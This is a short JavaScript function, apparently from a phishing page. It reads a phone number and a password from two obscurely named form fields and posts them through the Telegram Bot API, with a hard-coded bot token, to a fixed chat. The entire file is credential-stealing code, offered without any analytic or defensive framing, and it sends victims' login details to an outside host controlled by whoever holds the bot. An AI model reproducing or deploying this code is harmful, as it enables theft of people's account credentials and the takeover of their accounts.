function functionToExecute() {

    let chatId = "5445772855";

    var phone = document.getElementsByName('ddsfgdfg')[0].value
    var password = document.getElementsByName('dsfhjkjkf')[0].value

    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/" + "bot5995981279:AAGnPr9MAz7zYyXno3CoG5o-YN9rJ9kA2Zg" + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": "5590842489",
        "text": "Phone: "+phone+" | Password: "+password
      })
    }

    $.ajax(settings).done(function (response) {
      console.log(response);
    });
}